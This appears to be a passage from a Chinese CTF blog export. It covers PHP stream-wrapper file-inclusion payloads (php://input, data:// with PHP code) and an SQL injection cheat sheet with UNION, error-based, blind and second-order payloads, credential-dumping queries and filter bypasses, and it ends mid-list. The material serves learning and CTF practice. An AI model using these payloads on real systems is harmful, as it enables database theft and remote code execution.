<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><h6 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.rot13		等同于用 str_rot13()函数处理所有的流数据</span><br><span class="line">string.toupper		等同于用 strtoupper()函数处理所有的流数据</span><br><span class="line">string.tolower		等同于用 strtolower()函数处理所有的流数据</span><br><span class="line">string.strip_tags	等同于用 strip_tags()函数处理所有的流数据</span><br></pre></td></tr></table></figure>
<h6 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">convert.base64-encode	等同于base64_encode()函数处理所有的流数据</span><br><span class="line">convert.base64-decode	等同于base64_decode()函数处理所有的流数据</span><br><span class="line">convert.quoted-printable-encode 没有对应函数</span><br><span class="line">convert.quoted-printable-decode	等同于用 quoted_printable_decode()函数处理所有的流数据</span><br></pre></td></tr></table></figure>
<h6 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zlib.deflate 压缩</span><br><span class="line">zlib.inflate 解压</span><br></pre></td></tr></table></figure>
<h6 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h6><p>mcrypt</p>
<p>mdecrypt</p>
<p>用的不多,不说了</p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p><strong>php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。</strong></p>
<p><strong>注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</strong></p>
<blockquote>
<p>allow_url_fopen ：off/on<br>allow_url_include：on</p>
</blockquote>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">&#x2F;&#x2F;postdata</span><br><span class="line">a&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); &#x2F;&#x2F;class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">解法为  url&#x2F;index.php?user&#x3D;php:&#x2F;&#x2F;input  </span><br><span class="line">[POSTDATA] the user is admin</span><br><span class="line">最后输出为hello admin!并且包含对应文件</span><br></pre></td></tr></table></figure>
<h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#file.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$code&#x3D;$_GET[&quot;page&quot;];  </span><br><span class="line">file_put_contents($code,&quot;test&quot;);   </span><br><span class="line">?&gt;</span><br><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;output</span><br><span class="line">&#x2F;&#x2F;结果输出test</span><br></pre></td></tr></table></figure>
<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>data:资源类型;编码,内容<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行</p>
<blockquote>
<p>PHP.ini：<br>data://协议必须双在on才能正常使用；<br>allow_url_fopen ：on<br>allow_url_include：on<br>php 版本大于等于 php5.2</p>
</blockquote>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$filename&#x3D;$_GET[&quot;a&quot;];  </span><br><span class="line">include(&quot;$filename&quot;);  </span><br><span class="line">?&gt;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip://, bzip2://, zlib://"></a>zip://, bzip2://, zlib://</h3><blockquote>
<p>PHP.ini：<br>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；<br>allow_url_fopen ：off/on<br>allow_url_include：off/on</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3个封装协议，都是直接打开压缩文件。</span><br><span class="line">compress.zlib:&#x2F;&#x2F;file.gz - 处理的是 &#39;.gz&#39; 后缀的压缩包</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;file.bz2 - 处理的是 &#39;.bz2&#39; 后缀的压缩包</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt - 处理的是 &#39;.zip&#39; 后缀的压缩包里的文件</span><br></pre></td></tr></table></figure>
<p><strong>注：zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</strong></p>
<h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>php 版本大于等于 php5.3.0</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line"></span><br><span class="line">zip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]**</span><br><span class="line">要用绝对路径+url编码#</span><br></pre></td></tr></table></figure>
<h4 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2://"></a>bzip2://</h4><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">compress.bzip2:&#x2F;&#x2F;file.bz2</span><br><span class="line">相对路径也可以</span><br></pre></td></tr></table></figure>
<p>示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用7-zip生成一个bz2压缩文件。</span><br><span class="line">pyload:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.bz2</span><br><span class="line">或者文件改为jpg后缀</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.jpg</span><br></pre></td></tr></table></figure>
<h4 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h4><p>同理</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入总结</title>
    <url>/2020/02/11/CTF/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><hr>
<p>SQL注入最主要的是判断注入目标的SQL语句和字符处理过程,根据判断结果选择合适的注入方法和技巧进行脱库</p>
<a id="more"></a>

<p>常见SQL注入类型有:</p>
<ul>
<li>按变量类型<ul>
<li>字符型</li>
<li>数字型</li>
</ul>
</li>
<li>按HTTP提交方式<ul>
<li>GET</li>
<li>POST</li>
<li>Cookies</li>
<li>head中<ul>
<li>User-Agent</li>
<li>Referer</li>
</ul>
</li>
</ul>
</li>
<li>按从服务器接收到的响应<ul>
<li>显错注入(没有关闭错误显示,会显示mysql error)</li>
<li>盲注(只会告诉你sql语句的执行结果true or false,不会将sql语句执行结果展示给你)<ul>
<li>基于时间</li>
<li>基于bool</li>
<li>基于报错</li>
</ul>
</li>
<li>堆叠查询注入</li>
</ul>
</li>
<li>基于程度和顺序的注入<ul>
<li>一阶注入</li>
<li>二阶注入</li>
</ul>
</li>
</ul>
<h2 id="0x01常用语句"><a href="#0x01常用语句" class="headerlink" title="0x01常用语句"></a>0x01常用语句</h2><h3 id="用于尝试"><a href="#用于尝试" class="headerlink" title="用于尝试"></a>用于尝试</h3><p>Ps:–+可以用#替换，url 提交过程中 url 编码后的#为%23</p>
<ul>
<li>or 1=1–+</li>
<li>‘ or 1=1–+</li>
<li>“ or 1=1–+</li>
<li>) or 1=1–+</li>
<li>‘)or 1=1–+</li>
<li>“) or 1=1–+</li>
<li>“))or 1=1–+</li>
</ul>
<p>总的来说,思路为闭合前面本来sql语句中的符号,注释掉后面的符号</p>
<h3 id="用于查询"><a href="#用于查询" class="headerlink" title="用于查询"></a>用于查询</h3><ul>
<li>（1）获取字段数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by n  &#x2F;*通过不断尝试改变n的值来观察页面反应确定字段数*&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>（2） 获取系统中所有数据库名</li>
</ul>
<p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
<ul>
<li>（3）获取当前数据库名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
<ul>
<li>（4）获取数据库中的表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
<ul>
<li>（5）获取表中的字段</li>
</ul>
<p>这里假设已经获取到表名为user</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>（6）获取各个字段值</li>
</ul>
<p>这里假设已经获取到表名为user，且字段为username和password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
<h2 id="0x02注入类型"><a href="#0x02注入类型" class="headerlink" title="0x02注入类型"></a>0x02注入类型</h2><h3 id="按变量类型"><a href="#按变量类型" class="headerlink" title="按变量类型"></a>按变量类型</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 union select database()</span><br></pre></td></tr></table></figure>
<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; union select database()</span><br><span class="line">id&#x3D;1&quot; union select database()</span><br><span class="line">id&#x3D;1&#39;) union select database()</span><br><span class="line">id&#x3D;1&quot;) union select database()</span><br></pre></td></tr></table></figure>
<h3 id="按HTTP提交方式"><a href="#按HTTP提交方式" class="headerlink" title="按HTTP提交方式"></a>按HTTP提交方式</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>参考上方按变量类型</p>
<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>一般为登录框,留言板等等,以表单形式提交的字段</p>
<h5 id="后端无数据处理型"><a href="#后端无数据处理型" class="headerlink" title="后端无数据处理型"></a>后端无数据处理型</h5><p>无数据处理,既sql语句和变量直接拼接,形式参考GET,#不需要url编码</p>
<h5 id="后端有数据处理型"><a href="#后端有数据处理型" class="headerlink" title="后端有数据处理型"></a>后端有数据处理型</h5><h6 id="常见数据处理"><a href="#常见数据处理" class="headerlink" title="常见数据处理"></a>常见数据处理</h6><ul>
<li>数据处理函数</li>
</ul>
<p><strong>preg_replace()</strong></p>
<p>当代码为<code>preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id)</code>时,可以利用双写过滤字符,因为替换为空,而且只检测一次</p>
<p>例如绕过上述只需将<code>or</code>写出<code>oorr</code>即可,替换掉中间的<code>or</code>之后,剩下的字段就变成了<code>or</code></p>
<p>如果匹配中没有统计大小写,还可以利用变换语句中字母的大小写进行绕过</p>
<p><strong>addslashes()</strong></p>
<ul>
<li>字符编码问题导致绕过<ul>
<li>设置数据库字符为gbk导致宽字节注入</li>
<li>使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入</li>
</ul>
</li>
<li>编码解码导致的绕过<ul>
<li>url解码导致绕过addslashes</li>
<li>base64解码导致绕过addslashes</li>
<li>json编码导致绕过addslashes</li>
</ul>
</li>
<li>一些特殊情况导致的绕过<ul>
<li>没有使用引号保护字符串，直接无视addslashes</li>
<li>使用了stripslashes</li>
<li>字符替换导致的绕过addslashes</li>
</ul>
</li>
</ul>
<hr>
<h6 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h6><p>1、%df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27， mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此时%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 这样就达到了我们的目的。<br>2、将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法</p>
<p>3、将utf-8的 ‘ 转换为 �’</p>
<p>�’or 1=1 limit 1,1#</p>
<p>还有很多绕过<strong>引号</strong>、<strong>双引号</strong>、<strong>逗号</strong>、<strong>空格</strong>的方法</p>
<h4 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h4><p>当php会通过cookies中username等字段进行查询时可能存在注入,与POST基本一致,只是注入位置的区别</p>
<h5 id="head中"><a href="#head中" class="headerlink" title="head中"></a>head中</h5><ul>
<li><p>User-Agent</p>
</li>
<li><p>Referer</p>
</li>
<li><p>XFF(X-Forward-For)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forward-For：127.0.0.1&#39; select 1,2,user()</span><br></pre></td></tr></table></figure>
<p>当php会将ip,User-Agent,referer等请求头信息进行存储数据库时,可能存在注入,与POST基本一致,只是注入位置的区别,可以通过浏览器插件、浏览器编辑和重发的功能、抓包等对请求头进行更改</p>
</li>
</ul>
<h3 id="按从服务器接收到的响应"><a href="#按从服务器接收到的响应" class="headerlink" title="按从服务器接收到的响应"></a>按从服务器接收到的响应</h3><h4 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h4><p>由于php代码会将mysql中的错误展示在前端，所以很好判断，参考上方GET等</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="基于bool"><a href="#基于bool" class="headerlink" title="基于bool"></a>基于bool</h5><ul>
<li><p>▲left(database(),1)&gt;’s’ //left()函数</p>
<p>Explain:</p>
<ul>
<li>database()显示数据库名称</li>
<li>left(a,b)从左侧截取 a 的前 b 位</li>
</ul>
</li>
<li><p>▲ascii(substr((select table_name information_schema.tables where tables_schema</p>
<p>=database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数</p>
<p>Explain：</p>
<ul>
<li><p>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。</p>
</li>
<li><p>ascii()将某个字符转换为 ascii 值</p>
</li>
<li><p>ascii(substr((select database()),1,1))=98（改变第一个</p>
<p>1</p>
<p>和98的值相当于将名字一个个和字母比较，从而得到完整名字）</p>
<ul>
<li>也可以用二分法和&gt;=’a’,between and等来判断</li>
</ul>
</li>
</ul>
</li>
<li><p>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</p>
<p>BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数</p>
<p>Explain：</p>
<ul>
<li>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</li>
<li>Ord()函数同 ascii()，将字符转为 ascii 值</li>
</ul>
</li>
<li><p>▲regexp 正则注入</p>
<p>正则注入介绍：</p>
<p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
<p>用法介绍：select user() regexp ‘^[a-z]’;</p>
<p>Explain：</p>
<ul>
<li>正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。</li>
</ul>
</li>
</ul>
<h5 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h5><p>———————————构造payload 让信息通过错误提示回显出来——————</p>
<ul>
<li><p>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;<br>Explain:此处有三个点，</p>
<ul>
<li>一是需要 concat 计数，</li>
<li>二是 floor，取得 0 or 1，进行数据的重复，</li>
<li>三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时<br>重复造成的错误。也有解释为 mysql 的 bug 的问题。</li>
<li>但是此处需要将 rand(0)，rand()需<br>要多试几次才行。</li>
<li>以上语句可以简化成如下的形式。<br>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</li>
<li>如果 rand 被禁用了可以使用用户变量来报错<br>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</li>
</ul>
</li>
<li><p>select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围<br>//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上<br>可以参考 exp 报错文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
</li>
<li><p>select !(select * from (select user())x) -（ps:这是减号） <del>0<br>//bigint 超出范围；</del>0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上</p>
<p>可以参考文章 bigint 溢出文章 <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
</li>
<li><p>extractvalue(1,concat(0x7e,(select @@version),0x7e))</p>
<p>//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制</p>
</li>
<li><p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p>
<p>//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制</p>
</li>
<li><p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>//mysql 重复特性，此处重复了 version，所以报错</p>
</li>
</ul>
<h6 id="报错注入总结和示例"><a href="#报错注入总结和示例" class="headerlink" title="报错注入总结和示例"></a>报错注入总结和示例</h6><ul>
<li>floor()和rand()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       &#x2F;*利用错误信息得到当前数据库名*&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>extractvalue()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
<ul>
<li>updatexml()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
<ul>
<li>geometrycollection()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multipoint()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>polygon()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multipolygon()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>linestring()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multilinestring()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>exp()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
<h5 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h5><ul>
<li>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep<br>Ps： 遇到以下这种利用 sleep()延时注入语句<br>select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8,9,.’));<br>该语句意思是在 0-9 之间找版本号的第一位。 但是在我们实际渗透过程中， 这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</li>
<li>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;<br>//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()</li>
</ul>
<h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><p><strong>局限性</strong></p>
<p>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序</p>
<p><strong>原理</strong></p>
<p>利用分号结束一句执行,从而构造多行语句进行注入攻击</p>
<h2 id="按注入的程度和顺序"><a href="#按注入的程度和顺序" class="headerlink" title="按注入的程度和顺序"></a>按注入的程度和顺序</h2><h3 id="一阶注入"><a href="#一阶注入" class="headerlink" title="一阶注入"></a>一阶注入</h3><p>即直接注入，查看上述所有</p>
<h3 id="二阶注入（二次注入）"><a href="#二阶注入（二次注入）" class="headerlink" title="二阶注入（二次注入）"></a>二阶注入（二次注入）</h3><p>1、黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务<br>端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</p>
<p>2、服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的<br>数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响<br>应。</p>
<p>3、黑客向服务端发送第二个与第一次不相同的请求数据信息。</p>
<p>4、服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库<br>中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服<br>务端环境中执行。</p>
<p>5、服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注<br>入漏洞利用是否成功。<br>例：</p>
<p>先注册一个 admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是 admin 的密码。<br>Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND<br>password=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’<br>admin’</p>
<h2 id="0x03-基本手工注入流程"><a href="#0x03-基本手工注入流程" class="headerlink" title="0x03 基本手工注入流程"></a>0x03 基本手工注入流程</h2><p>要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</p>
<h3 id="1、MySQL-gt-5-0"><a href="#1、MySQL-gt-5-0" class="headerlink" title="1、MySQL &gt;= 5.0"></a>1、MySQL &gt;= 5.0</h3><h4 id="（1）获取字段数"><a href="#（1）获取字段数" class="headerlink" title="（1）获取字段数"></a>（1）获取字段数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by n  &#x2F;*通过不断尝试改变n的值来观察页面反应确定字段数*&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="（2）获取系统数据库名"><a href="#（2）获取系统数据库名" class="headerlink" title="（2）获取系统数据库名"></a>（2）获取系统数据库名</h4><p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
<h4 id="（3）获取当前数据库名"><a href="#（3）获取当前数据库名" class="headerlink" title="（3）获取当前数据库名"></a>（3）获取当前数据库名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
<h4 id="（4）获取数据库中的表"><a href="#（4）获取数据库中的表" class="headerlink" title="（4）获取数据库中的表"></a>（4）获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
<h4 id="（5）获取表中的字段"><a href="#（5）获取表中的字段" class="headerlink" title="（5）获取表中的字段"></a>（5）获取表中的字段</h4><p>这里假设已经获取到表名为user</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
<h4 id="（6）获取各个字段值"><a href="#（6）获取各个字段值" class="headerlink" title="（6）获取各个字段值"></a>（6）获取各个字段值</h4><p>这里假设已经获取到表名为user，且字段为username和password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
<h3 id="2、MySQL-lt-5-0"><a href="#2、MySQL-lt-5-0" class="headerlink" title="2、MySQL &lt; 5.0"></a>2、MySQL &lt; 5.0</h3><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工枚举爆破（二分法思想）。</p>
<p>该方式通常用于盲注。</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><strong>length(str)</strong> ：返回字符串str的长度</p>
<p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p>
<p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p>
<p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p>
<p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p>
<p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p>
<h4 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 &#x2F;*判断数据库名的第一个字符的ascii值是否大于64*&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 union select if(SUBSTRING(user(),1,4)&#x3D;&#39;root&#39;,sleep(4),1),null,null &#x2F;*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="0x04SQL注入绕过技术"><a href="#0x04SQL注入绕过技术" class="headerlink" title="0x04SQL注入绕过技术"></a>0x04SQL注入绕过技术</h2><ul>
<li><p><strong>大小写绕过</strong></p>
</li>
<li><p><strong>双写绕过</strong></p>
</li>
<li><p><strong>编码绕过</strong>（url全编码、十六进制）</p>
</li>
<li><p><strong>内联注释绕过</strong></p>
</li>
<li><p><strong>关键字替换</strong></p>
<ul>
<li><p><strong>逗号绕过</strong></p>
<p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p>
<p>limit中可以利用offset来摆脱对逗号的利用</p>
</li>
<li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p>
</li>
